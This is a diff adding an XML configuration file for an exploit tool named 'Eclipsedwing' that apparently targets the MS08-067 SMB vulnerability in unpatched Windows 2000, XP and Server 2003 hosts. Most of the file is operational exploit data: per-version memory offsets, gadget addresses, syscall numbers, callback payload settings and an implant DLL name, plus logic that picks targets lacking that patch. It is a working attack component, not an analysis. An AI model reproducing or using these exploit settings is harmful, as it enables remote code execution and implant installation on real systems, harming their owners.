@@ -1,0 +1,341 @@
+<?xml version="1.0"?>
+<t:config id="def84fcfbc30f146f982bf43d536f300bf2e6485"
+          name="Eclipsedwing"
+          version="1.5.2"
+          configversion="1.5.2.0"
+          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+          xmlns:t='tc0'>
+
+    <t:inputparameters>
+
+        <t:parameter name="TargetIp" description="Target IP Address" type="IPv4" />
+        <t:parameter name="TargetPort" 
+            description="Port used by Netbios or SMB"
+            type="TcpPort" />
+        <t:paramchoice name="Protocol" description="Protocol to connect to target with">
+            <t:paramgroup name="SMB" description="SMB over TCP"/>
+            <t:paramgroup name="NBT" description="Netbios over TCP"/>
+        </t:paramchoice>
+        <t:parameter name="NetworkTimeout" 
+            description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." 
+            type="S16" 
+            default="60"/>
+
+        <t:parameter name="ClientName" 
+            description="Client SMB Name" 
+            type="String" 
+            hidden="true" 
+            default="*SMBCLIENT"/>
+        <t:parameter name="ServerName" 
+            description="Server SMB name" 
+            type="String" 
+            hidden="true" 
+            default="*SMBSERVER"/>
+        <t:paramchoice name="Payload" description="Listen or Callback paylaod" default="Callback">
+            <t:paramgroup name="Callback" description="Callback payload">
+
+                <t:parameter name="CallbackIp" description="Callback IP address" type="IPv4"/>
+                <t:parameter name="CallbackPort" description="Callback port" type="TcpPort" default="0"/>
+                <t:parameter name="CallbackLocalPort" description="Local callback port" type="TcpPort" required="false"/>
+            </t:paramgroup>
+            <t:paramgroup name="RPCReuse" description="RPC Proxy payload">
+                <t:parameter name="FbStorage"
+                    description="base path to implant payload dll"
+                    type="String"/>
+                <t:parameter name="PayloadDll"
+                    description="implant payload dll name"
+                    type="String"
+                    default="wbemess2.dll"/>
+            </t:paramgroup>
+            <!--
+            <t:paramgroup name="Listener" description="Listener payload">
+                <t:parameter name="ListenPort" description="Listen port" type="TcpPort" default="0"/>
+                <t:parameter name="CallinPort" description="Call in port" type="TcpPort" default="0"/>
+                <t:parameter name="CallinTimeout" description="Timeout to wait before trying to connect in." type="S16" default="60"/>
+            </t:paramgroup>
+            -->
+        </t:paramchoice>
+
+        <t:parameter name="PrefixLength" description="" type="U32" value="0xB8" hidden="true"/>    
+        <t:parameter name="BufferLength" description="" type="U32" value="0xFA0" hidden="true"/>
+        <t:parameter name="ProcHandleOffset" description="" type="U32" value="0x08" hidden="true"/>
+        <t:parameter name="ProcHandleOffset2" description="" type="U32" value="0x34" hidden="true"/>
+        <t:parameter name="ProcHandleValue" description="" type="U32" value="0xFFFFFFFF" hidden="true"/>
+
+        <!-- the 0x0C offset is set from InitialEcxValue -->
+        <t:parameter name="PtrRwSizeOffset" description="" type="U32" value="0x10" hidden="true"/>
+        <t:parameter name="PtrRwSizeOffset2" description="" type="U32" value="0x3C" hidden="true"/>
+        <t:parameter name="ExeFlagsOffset" description="" type="U32" value="0x14" hidden="true"/>
+        <t:parameter name="ExeFlagsOffset2" description="" type="U32" value="0x40" hidden="true"/>
+        <t:parameter name="ExeFlagsValue" description="" type="U32" value="0x00000040" hidden="true"/>
+        <t:parameter name="UnpatchedRetOffset" description="" type="U32" value="0x1C" hidden="true"/>
+        <t:parameter name="UnpatchedEcxOffset" description="" type="U32" value="0x20" hidden="true"/>
+        <t:parameter name="PatchedEcxOffset" description="" type="U32" value="0x28" hidden="true"/>
+        <t:parameter name="CommonRetOffset" description="" type="U32" value="0x24" hidden="true"/> 
+        <t:parameter name="LoadEaxPtrOffset" description="" type="U32" value="0x2C" hidden="true"/>
+        <t:parameter name="LoadEaxPtrOffset2" description="" type="U32" value="0x70" hidden="true"/>
+        <t:parameter name="EaxPtrOffset" description="" type="U32" value="0x30" hidden="true"/>
+        <t:parameter name="AddEaxPtrEdxOffset" description="" type="U32" value="0x38" hidden="true"/>
+        <t:parameter name="EbxToWriteableOffset" description="" type="U32" value="0x48" hidden="true"/>
+        <t:parameter name="EbxPtrOffset" description="" type="U32" value="0x54" hidden="true"/>
+        <t:parameter name="MovHeapPtrToEcxOffset" description="" type="U32" value="0x58" hidden="true"/>
+        <t:parameter name="EaxNegValOffset" description="" type="U32" value="0x84" hidden="true"/>
+        <t:parameter name="MovEcxEspOffset" description="" type="U32" value="0x8C" hidden="true"/>
+        <t:parameter name="HeapRetAddrOffset" description="" type="U32" value="0x98" hidden="true"/>
+        <t:parameter name="HeapRetAddrOffset2" description="" type="U32" value="0x20" hidden="true"/>
+        <t:parameter name="HeapRetEbxOffset" description="" type="U32" value="0x68" hidden="true"/>
+        <t:parameter name="HeapRetEbpOffset" description="" type="U32" value="0x88" hidden="true"/>
+        <t:parameter name="HeapRetEsiOffset" description="" type="U32" value="0x40" hidden="true"/>
+        <t:parameter name="PtrPtrHeapOffset" description="" type="U32" value="0x0C" hidden="true"/> <!-- used in buffer, not prefix - will be InitialEcxValue + 4 -->
+        <t:parameter name="PtrPtrHeapOffset2" description="" type="U32" value="0x38" hidden="true"/> <!-- used in buffer, not prefix - will be InitialEcxValue + 4 -->
+        <t:parameter name="GetExecutionToBufferOffset" description="" type="U32" value="0x04" hidden="true"/>
+        <t:parameter name="GetExecutionToBufferOffset2" description="" type="U32" value="0x30" hidden="true"/>
+        <t:parameter name="WriteMemoryOffset" description="" type="U32" value="0x18" hidden="true"/>
+        <t:parameter name="WriteMemoryOffset2" description="" type="U32" value="0x44" hidden="true"/>
+        <t:parameter name="WriteMemoryOffset3" description="" type="U32" value="0x1C" hidden="true"/>
+        <t:parameter name="CallEcxOffset" description="" type="U32" value="0x4c" hidden="true"/>
+        <t:parameter name="HeapRetEbxValue" description="" type="U32" value="0x7ffe0300" hidden="true"/> <!-- address of kernel32.dll import of NtProtectVirtualMemory -->
+ 
+
+        <t:paramchoice name="Target" description="Operating System, Service Pack, and Language of target OS">
+            <t:paramgroup name="W2K" description="Windows 2000 All">
+                <t:parameter name="xor_key_reg" description="" type="U8" value="0x55" hidden="true"/>
+                <t:parameter name="initial_eax_val" description="" type="U32" value="0xfffffc17" hidden="true"/>
+                <t:parameter name="sub_eax_val" description="" type="U32" value="0xffffff34" hidden="true"/>
+                <t:parameter name="NoNX" description="" type="Boolean" value="true" hidden="true"/>
+                <t:parameter name="CallESP" description="" type="U32" value="0x001f10c8" hidden="true"/>
+            </t:paramgroup>
+
+            <!-- These next 3 are all the same -->
+            <t:paramgroup name="XPSP0" description="Windows XP, Service Pack 0">
+                <t:parameter name="xor_key_reg" description="" type="U8" value="0x51" hidden="true"/>
+                <t:parameter name="initial_eax_val" description="" type="U32" value="0xfffffcd3" hidden="true"/>
+                <t:parameter name="sub_eax_val" description="" type="U32" value="0xffffff36" hidden="true"/>
+                <t:parameter name="NoNX" description="" type="Boolean" value="true" hidden="true"/>
+                <t:parameter name="CallESP" description="" type="U32" value="0x001a762f" hidden="true"/>
+            </t:paramgroup>
+            <t:paramgroup name="XPSP1" description="Windows XP, Service Pack 1">
+                <t:parameter name="xor_key_reg" description="" type="U8" value="0x51" hidden="true"/>
+                <t:parameter name="initial_eax_val" description="" type="U32" value="0xfffffcd3" hidden="true"/>
+                <t:parameter name="sub_eax_val" description="" type="U32" value="0xffffff36" hidden="true"/>
+                <t:parameter name="NoNX" description="" type="Boolean" value="true" hidden="true"/>
+                <t:parameter name="CallESP" description="" type="U32" value="0x001a762f" hidden="true"/>
+            </t:paramgroup>
+            <t:paramgroup name="XPSP2" description="Windows XP, Service Pack 2">
+                <t:parameter name="ShellcodeOffset" description="" type="U32" value="0x78" hidden="true"/>
+                <t:parameter name="RsaenhBaseAddress" description="" type="U32" value="0x0ffd0000" hidden="true"/>
+                <t:parameter name="UnpatchedRetValue" description="" type="U32" value="0x7A31" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="CommonRetValue" description="" type="U32" value="0x1095F" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="InitialEcxValue" description="" type="U32" value="0x24588" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="LoadEaxPtrValue" description="" type="U32" value="0xA08D" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EaxPtrValue" description="" type="U32" value="0x0ffe131E" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="AddEaxPtrEdxValue" description="" type="U32" value="0x1A5A1" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EbxToWriteableValue" description="" type="U32" value="0x1AAD5" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EbxPtrValue" description="" type="U32" value="0x2458C" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="MovHeapPtrToEcxValue" description="" type="U32" value="0x1E64D" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EaxNegValValue" description="" type="U32" value="0xFFFFFF30" hidden="true"/>
+                <t:parameter name="MovEcxEspValue" description="" type="U32" value="0x135BE" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="HeapRetAddrValue" description="" type="U32" value="0x14D7C" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="HeapRetEbpValue" description="" type="U32" value="0x24590" hidden="true"/> <!-- offset from base address -->
+                <!-- non-prefix parameters -->
+                <t:parameter name="PtrRet18Value" description="" type="U32" value="0xcc39" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue" description="" type="U32" value="0x22064" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue2" description="" type="U32" value="0x2251f" hidden="true"/>
+                <t:parameter name="GetExecutionToBufferValue" description="" type="U32" value="0xEFDF" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="WriteMemoryValue" description="" type="U32" value="0x24588" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="CallEcxValue" description="" type="U32" value="0x134B0" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="NtAllocatePtr" description="" type="U32" value="0x00000011" hidden="true"/> <!-- address of kernel32.dll import of NtAllocateVirtualMemory -->
+                <!-- 50 c3 -->
+                <t:parameter name="CallEaxRetValue" description="" type="U32" value="0x135cb" hidden="true"/>
+                <!-- 8d 6c 24 10 2b e0 -->
+                <t:parameter name="GetStackPtr" description="" type="U32" value="0x135e8" hidden="true"/>
+                <t:parameter name="SyscallVProtectValue" description="" type="U32" value="0x00000089" hidden="true"/> <!-- address of kernel32.dll import of NtProtectVirtualMemory -->
+            </t:paramgroup>
+
+            <t:paramgroup name="XPSP3" description="Windows XP, Service Pack 3">
+                <t:parameter name="ShellcodeOffset" description="" type="U32" value="0x78" hidden="true"/>
+                <t:parameter name="RsaenhBaseAddress" description="" type="U32" value="0x68000000" hidden="true"/>
+                <t:parameter name="UnpatchedRetValue" description="" type="U32" value="0x82c9" hidden="true"/> 
+                <t:parameter name="CommonRetValue" description="" type="U32" value="0x121de" hidden="true"/> 
+                <t:parameter name="InitialEcxValue" description="" type="U32" value="0x32020" hidden="true"/>
+                <t:parameter name="LoadEaxPtrValue" description="" type="U32" value="0xA965" hidden="true"/>
+                <t:parameter name="EaxPtrValue" description="" type="U32" value="0x6802c91f" hidden="true"/> 
+                <t:parameter name="AddEaxPtrEdxValue" description="" type="U32" value="0x1fce1" hidden="true"/> 
+                <t:parameter name="EbxToWriteableValue" description="" type="U32" value="0x20395" hidden="true"/> 
+                <t:parameter name="EbxPtrValue" description="" type="U32" value="0x32024" hidden="true"/> 
+                <t:parameter name="MovHeapPtrToEcxValue" description="" type="U32" value="0x24f9b" hidden="true"/> 
+                <t:parameter name="EaxNegValValue" description="" type="U32" value="0xFFFFFF30" hidden="true"/>
+                <t:parameter name="MovEcxEspValue" description="" type="U32" value="0x14f5e" hidden="true"/> 
+                <t:parameter name="HeapRetAddrValue" description="" type="U32" value="0x11740" hidden="true"/>
+                <t:parameter name="HeapRetEbpValue" description="" type="U32" value="0x32028" hidden="true"/> <!-- offset from base address -->
+                <!-- non-prefix parameters -->
+                <t:parameter name="PtrRet18Value" description="" type="U32" value="0xfe47" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue" description="" type="U32" value="0x31486" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue2" description="" type="U32" value="0x2f9f7" hidden="true"/>
+                <t:parameter name="GetExecutionToBufferValue" description="" type="U32" value="0x1006b" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="WriteMemoryValue" description="" type="U32" value="0x32020" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="CallEcxValue" description="" type="U32" value="0x14e57" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="NtAllocatePtr" description="" type="U32" value="0x00000011" hidden="true"/> <!-- address of kernel32.dll import of NtAllocateVirtualMemory -->
+                                <!-- 50 c3 -->
+                <t:parameter name="CallEaxRetValue" description="" type="U32" value="0x14f6b" hidden="true"/>
+                <!-- 8d 6c 24 10 2b e0 -->
+                <t:parameter name="GetStackPtr" description="" type="U32" value="0x14f88" hidden="true"/>
+                <t:parameter name="SyscallVProtectValue" description="" type="U32" value="0x00000089" hidden="true"/> <!-- address of kernel32.dll import of NtProtectVirtualMemory -->
+            </t:paramgroup>
+
+            <t:paramgroup name="W2K3SP0" description="Windows 2003, Service Pack 0">
+                <t:parameter name="xor_key_reg" description="" type="U8" value="0x51" hidden="true"/>
+                <t:parameter name="initial_eax_val" description="" type="U32" value="0xfffffcd3" hidden="true"/>
+                <t:parameter name="sub_eax_val" description="" type="U32" value="0xffffff36" hidden="true"/>
+                <t:parameter name="NoNX" description="" type="Boolean" value="true" hidden="true"/>
+                <t:parameter name="CallESP" description="" type="U32" value="0x001a762f" hidden="true"/>
+            </t:paramgroup>
+            
+            <t:paramgroup name="W2K3SP1" description="Windows 2003, Service Pack 1">
+                <t:parameter name="ShellcodeOffset" description="" type="U32" value="0x78" hidden="true"/>
+                <t:parameter name="RsaenhBaseAddress" description="" type="U32" value="0x68000000" hidden="true"/>
+                <t:parameter name="UnpatchedRetValue" description="" type="U32" value="0x8430" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="CommonRetValue" description="" type="U32" value="0x12ce6" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="InitialEcxValue" description="" type="U32" value="0x2ba08" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="LoadEaxPtrValue" description="" type="U32" value="0x92a1" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EaxPtrValue" description="" type="U32" value="0x6800cb52" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="AddEaxPtrEdxValue" description="" type="U32" value="0x21899" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EbxToWriteableValue" description="" type="U32" value="0x21dd5" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EbxPtrValue" description="" type="U32" value="0x2ba0C" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="MovHeapPtrToEcxValue" description="" type="U32" value="0x25a5f" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EaxNegValValue" description="" type="U32" value="0xFFFFFF30" hidden="true"/>
+                <t:parameter name="MovEcxEspValue" description="" type="U32" value="0x15ccc" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="HeapRetAddrValue" description="" type="U32" value="0x63eb" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="HeapRetEbpValue" description="" type="U32" value="0x2ba10" hidden="true"/> <!-- offset from base address -->
+                <!-- non-prefix parameters -->
+                <t:parameter name="PtrRet18Value" description="" type="U32" value="0xd9f7" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue" description="" type="U32" value="0x291c4" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue2" description="" type="U32" value="0x2b34f" hidden="true"/>
+                <t:parameter name="GetExecutionToBufferValue" description="" type="U32" value="0x108f0" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="WriteMemoryValue" description="" type="U32" value="0x2ba08" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="CallEcxValue" description="" type="U32" value="0x15bb5" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="NtAllocatePtr" description="" type="U32" value="0x00000012" hidden="true"/> <!-- address of kernel32.dll import of NtAllocateVirtualMemory -->
+                <!-- 50 c3 -->
+                <t:parameter name="CallEaxRetValue" description="" type="U32" value="0x15cb1" hidden="true"/>
+                <!-- 8d 6c 24 10 2b e0 -->
+                <t:parameter name="GetStackPtr" description="" type="U32" value="0x15cf4" hidden="true"/>
+                <t:parameter name="SyscallVProtectValue" description="" type="U32" value="0x0000008f" hidden="true"/> <!-- address of kernel32.dll import of NtProtectVirtualMemory -->
+            </t:paramgroup>
+
+             <t:paramgroup name="W2K3SP2" description="Windows 2003, Service Pack 2">
+                <t:parameter name="ShellcodeOffset" description="" type="U32" value="0x78" hidden="true"/>
+                <t:parameter name="RsaenhBaseAddress" description="" type="U32" value="0x68000000" hidden="true"/>
+                <t:parameter name="UnpatchedRetValue" description="" type="U32" value="0x8520" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="CommonRetValue" description="" type="U32" value="0x12f87" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="InitialEcxValue" description="" type="U32" value="0x312c0" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="LoadEaxPtrValue" description="" type="U32" value="0x9391" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EaxPtrValue" description="" type="U32" value="0x6800cc44" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="AddEaxPtrEdxValue" description="" type="U32" value="0x1fbd9" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EbxToWriteableValue" description="" type="U32" value="0x202b5" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EbxPtrValue" description="" type="U32" value="0x312c4" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="MovHeapPtrToEcxValue" description="" type="U32" value="0x24e68" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="EaxNegValValue" description="" type="U32" value="0xFFFFFF30" hidden="true"/>
+                <t:parameter name="MovEcxEspValue" description="" type="U32" value="0x1607c" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="HeapRetAddrValue" description="" type="U32" value="0x124e3" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="HeapRetEbpValue" description="" type="U32" value="0x312c8" hidden="true"/> <!-- offset from base address -->
+                <!-- non-prefix parameters -->
+                <t:parameter name="PtrRet18Value" description="" type="U32" value="0x6999" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue" description="" type="U32" value="0x3046e" hidden="true"/>
+                <t:parameter name="PtrRwSizeValue2" description="" type="U32" value="0x30667" hidden="true"/>
+                <t:parameter name="GetExecutionToBufferValue" description="" type="U32" value="0x10b1c" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="WriteMemoryValue" description="" type="U32" value="0x312c0" hidden="true"/> <!-- offset from base address -->
+                <t:parameter name="CallEcxValue" description="" type="U32" value="0x15f68" hidden="true"/> <!-- offset from base address -->
+                <!-- 50 c3 -->
+                <t:parameter name="CallEaxRetValue" description="" type="U32" value="0x16061" hidden="true"/>
+                <!-- 8d 6c 24 10 2b e0 -->
+                <t:parameter name="GetStackPtr" description="" type="U32" value="0x160a4" hidden="true"/>
+                <t:parameter name="NtAllocatePtr" description="" type="U32" value="0x00000012" hidden="true"/> <!-- address of kernel32.dll import of NtAllocateVirtualMemory -->
+                <t:parameter name="SyscallVProtectValue" description="" type="U32" value="0x0000008f" hidden="true"/> <!-- address of kernel32.dll import of NtProtectVirtualMemory -->
+            </t:paramgroup>
+        </t:paramchoice>
+    </t:inputparameters>
+
+    <t:outputparameters>
+        <t:parameter name="Contract"
+            description="Plugin contract"
+            type="String"
+            value="StagedUpload"/>
+        <t:paramchoice
+            name="Payload"
+            description="Comms method">
+            <t:paramgroup name="ConnectedSocket" description="traditional">
+                <t:parameter name="XorMask"
+                         description=""
+                         type="U8"/>
+                <t:parameter name="ConnectedTcp"
+                             description="Connected TCP Socket to target"
+                             type="Socket"/>
+            </t:paramgroup>
+            <t:paramgroup name="RPCProxy" description="traditional">
+                <t:parameter name="Protocol"
+                             description="Protocol to proxy with"
+                             type="String"/>
+            </t:paramgroup>
+        </t:paramchoice>
+
+    </t:outputparameters>
+    
+    <t:redirection>
+     <t:local protocol="Tcp"
+              listenaddr="TargetIp"
+              listenport="TargetPort"
+              destaddr="//identifier"
+              destport="TargetPort"
+              closeoncompletion="true"/>
+     <t:remote protocol="Tcp"
+               listenaddr="CallbackIp"
+               listenport="CallbackPort"
+               destport="CallbackLocalPort"/>
+  </t:redirection>
+
+  <t:logic>
+    <t:and>
+        <t:or>
+            <t:service name="smb">
+                <t:bindtovalue name="Protocol" value="SMB"/>
+                <t:bindtopath name="TargetPort" path="//service[name='smb']/port"/>
+            </t:service>
+            <t:service name="nbt">
+                <t:bindtovalue name="Protocol" value="NBT"/>
+                <t:bindtopath name="TargetPort" path="//service[name='nbt']/port"/>
+            </t:service>
+        </t:or> 
+        <t:or>
+            <t:os family="windows" name="Windows 2000">
+                <t:bindtovalue name="Target" value="W2K"/>
+            </t:os>
+            <t:os family="windows" name="Windows XP" servicepack="0">
+                <t:bindtovalue name="Target" value="XPSP0"/>
+            </t:os>
+            <t:os family="windows" name="Windows XP" servicepack="1">
+                <t:bindtovalue name="Target" value="XPSP1"/>
+            </t:os>
+            <t:os family="windows" name="Windows XP" servicepack="2">
+                <t:bindtovalue name="Target" value="XPSP2"/>
+            </t:os>
+            <t:os family="windows" name="Windows XP" servicepack="3">
+                <t:bindtovalue name="Target" value="XPSP3"/>
+            </t:os>
+            <t:os family="windows" name="Windows 2003" servicepack="0">
+                <t:bindtovalue name="Target" value="W2K3SP0"/>
+            </t:os>
+            <t:os family="windows" name="Windows 2003" servicepack="1">
+                <t:bindtovalue name="Target" value="W2K3SP1"/>
+            </t:os>
+            <t:os family="windows" name="Windows 2003" servicepack="2">
+                <t:bindtovalue name="Target" value="W2K3SP2"/>
+            </t:os>
+        </t:or> 
+        <t:not>
+            <t:os_patch name="MS08-67"/>
+        </t:not>
+        <t:bindtovalue name="Payload" value="Callback"/>
+    </t:and>
+  </t:logic>  
+    
+</t:config>
